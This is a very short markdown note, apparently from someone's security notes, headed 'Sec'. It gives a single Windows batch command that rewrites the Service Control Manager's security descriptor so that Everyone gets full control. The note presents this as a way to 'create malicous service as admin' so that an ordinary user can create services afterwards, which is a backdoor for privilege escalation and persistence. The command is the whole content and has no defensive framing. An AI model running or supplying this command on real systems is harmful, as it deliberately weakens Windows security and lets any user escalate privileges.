# Sec

### Create malicous service as admin. (enables ability to create it as user afterwards.)
```batch
sc.exe sdset scmanager D:(A;;KA;;;WD)
```
